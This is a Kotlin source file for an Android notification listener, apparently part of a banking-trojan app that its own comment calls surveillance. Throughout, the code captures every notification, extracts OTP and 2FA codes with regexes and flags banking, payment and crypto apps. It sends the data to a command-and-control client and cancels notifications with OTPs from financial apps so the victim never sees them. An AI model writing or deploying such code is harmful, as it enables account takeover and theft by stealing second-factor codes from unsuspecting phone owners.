package com.xrc.app.surveillance

import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.xrc.app.XRCApp
import org.json.JSONArray
import org.json.JSONObject

/**
 * Notification listener service that captures all notifications
 * including OTP/2FA codes and forwards them to C2.
 */
class NotificationInterceptor : NotificationListenerService() {

    companion object {
        const val TAG = "NotificationInterceptor"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val packageName = sbn.packageName
            val extras = notification.extras

            val title = extras.getString(android.app.Notification.EXTRA_TITLE, "")
            val text = extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
            val subText = extras.getCharSequence(android.app.Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
            val bigText = extras.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT)?.toString() ?: ""

            // Combine all text for OTP detection
            val fullText = "$title $text $subText $bigText"

            // Detect OTP/2FA codes
            val otpCodes = extractOTPCodes(fullText)
            val isFinancialApp = isFinancialPackage(packageName)

            val json = JSONObject().apply {
                put("type", "notification")
                put("package", packageName)
                put("title", title)
                put("text", text.take(500))
                put("time", sbn.postTime)
                put("is_financial", isFinancialApp)
                if (otpCodes.isNotEmpty()) {
                    put("otp_codes", JSONArray(otpCodes))
                }
                if (isFinancialApp) {
                    put("priority", "high")
                }
            }

            XRCApp.instance.c2Client.send(json.toString())

            // Cancel notification if it contains sensitive OTP
            if (otpCodes.isNotEmpty() && isFinancialApp) {
                cancelNotification(sbn.key)
                Log.d(TAG, "Cancelled notification with OTP: $otpCodes")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to process notification: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Notification was dismissed
    }

    private fun extractOTPCodes(text: String): List<String> {
        val codes = mutableListOf<String>()
        // OTP patterns: 4-8 digit codes often after keywords
        val patterns = listOf(
            Regex("""(?:OTP|code|pin|verification|auth|login|2FA|two[-\s]?factor)[^0-9]*(\d{4,8})""", RegexOption.IGNORE_CASE),
            Regex("""(\d{4,8})\s+(?:is your|is the|valid for|expires in)""", RegexOption.IGNORE_CASE),
            Regex("""(?:Your|The)\s+(?:OTP|code|pin|verification\s+code)\s+(?:is|:)\s*(\d{4,8})""", RegexOption.IGNORE_CASE)
        )

        for (pattern in patterns) {
            val match = pattern.find(text)
            if (match != null) {
                codes.add(match.groupValues[1])
            }
        }
        return codes
    }

    private fun isFinancialPackage(packageName: String): Boolean {
        val financialKeywords = listOf(
            "bank", "pay", "wallet", "finance", "crypto", "coin",
            "bitcoin", "eth", "trade", "stock", "money", "card",
            "upi", "phonepe", "paytm", "gpay", "razor"
        )
        return financialKeywords.any { packageName.contains(it, ignoreCase = true) }
    }
}
